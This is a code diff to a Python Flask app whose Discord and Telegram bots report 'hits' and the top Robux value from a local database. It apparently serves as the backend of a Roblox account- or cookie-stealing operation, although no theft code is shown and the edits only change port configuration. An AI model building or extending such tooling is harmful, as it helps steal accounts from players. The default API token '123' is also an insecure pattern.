@@ -16,6 +16,10 @@ ENABLE_TELEGRAM = bool(TELEGRAM_TOKEN and TELEGRAM_CHAT_ID)
 DISCORD_WEBHOOK_URL = os.environ.get("DISCORD_WEBHOOK_URL", "")
 API_TOKEN = os.environ.get("API_TOKEN", "123")
 
+# ---------- Internal API URL (the port is set by Render) ----------
+PORT = os.environ.get("PORT", "5000")
+API_BASE_URL = f"http://127.0.0.1:{PORT}"
+
 DB_FILE = "hits.db"
 
 # ---------- Database ----------
@@ -94,7 +98,7 @@ def start_bots():
     if _bots_started:
         return
     _bots_started = True
-    time.sleep(2)
+    time.sleep(3)  # give Flask more time to start
     if DISCORD_TOKEN and DISCORD_TOKEN != "YOUR_DISCORD_BOT_TOKEN":
         threading.Thread(target=run_discord_bot, daemon=True).start()
         print("[Bots] Discord bot started.")
@@ -160,7 +164,7 @@ def run_discord_bot():
     @bot.command(name='howmanyhits')
     async def how_many_hits(ctx):
         try:
-            resp = requests.get(f"http://127.0.0.1:5000/get_hits",
+            resp = requests.get(f"{API_BASE_URL}/get_hits",
                                 headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
                 await ctx.send("Error fetching hits.")
@@ -183,7 +187,7 @@ def run_discord_bot():
     @bot.command(name='total')
     async def total_hits(ctx):
         try:
-            resp = requests.get(f"http://127.0.0.1:5000/total",
+            resp = requests.get(f"{API_BASE_URL}/total",
                                 headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
                 await ctx.send("Error fetching total.")
@@ -196,7 +200,7 @@ def run_discord_bot():
     @bot.command(name='top')
     async def top_robux(ctx):
         try:
-            resp = requests.get(f"http://127.0.0.1:5000/top",
+            resp = requests.get(f"{API_BASE_URL}/top",
                                 headers={"X-Auth-Token": API_TOKEN}, timeout=10)
             if resp.status_code != 200:
                 await ctx.send("Error fetching top hit.")
@@ -209,7 +213,6 @@ def run_discord_bot():
         except Exception as e:
             await ctx.send(f"Error: {e}")
 
-    # Renamed from 'help' to 'commands' to avoid conflict with built-in help
     @bot.command(name='commands')
     async def commands_list(ctx):
         help_text = """
@@ -234,7 +237,7 @@ def run_telegram_bot():
 
         async def how_many_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"http://127.0.0.1:5000/get_hits",
+                resp = requests.get(f"{API_BASE_URL}/get_hits",
                                     headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
                     await update.message.reply_text("Error fetching hits.")
@@ -256,7 +259,7 @@ def run_telegram_bot():
 
         async def total_hits(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"http://127.0.0.1:5000/total",
+                resp = requests.get(f"{API_BASE_URL}/total",
                                     headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
                     await update.message.reply_text("Error fetching total.")
@@ -268,7 +271,7 @@ def run_telegram_bot():
 
         async def top_robux(update: Update, context: ContextTypes.DEFAULT_TYPE):
             try:
-                resp = requests.get(f"http://127.0.0.1:5000/top",
+                resp = requests.get(f"{API_BASE_URL}/top",
                                     headers={"X-Auth-Token": API_TOKEN}, timeout=10)
                 if resp.status_code != 200:
                     await update.message.reply_text("Error fetching top hit.")
@@ -281,7 +284,6 @@ def run_telegram_bot():
             except Exception as e:
                 await update.message.reply_text(f"Error: {e}")
 
-        # Renamed to 'commands' as well
         async def commands_list(update: Update, context: ContextTypes.DEFAULT_TYPE):
             help_text = """Available commands:
 /howmanyhits – Show 10 most recent hits
@@ -304,11 +306,12 @@ def run_telegram_bot():
 if __name__ == "__main__":
     if len(sys.argv) > 1 and sys.argv[1] == "--server":
         init_db()
-        threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':5000,'debug':False}, daemon=True).start()
+        threading.Thread(target=app.run, kwargs={'host':'0.0.0.0','port':int(PORT),'debug':False}, daemon=True).start()
         time.sleep(2)
         start_bots()
         while True:
             time.sleep(1)
     else:
-        print("Starting server (gunicorn) ...")
+        print(f"Starting server (gunicorn) on port {PORT} ...")
         init_db()
+        # gunicorn will run the app, no need to call app.run()
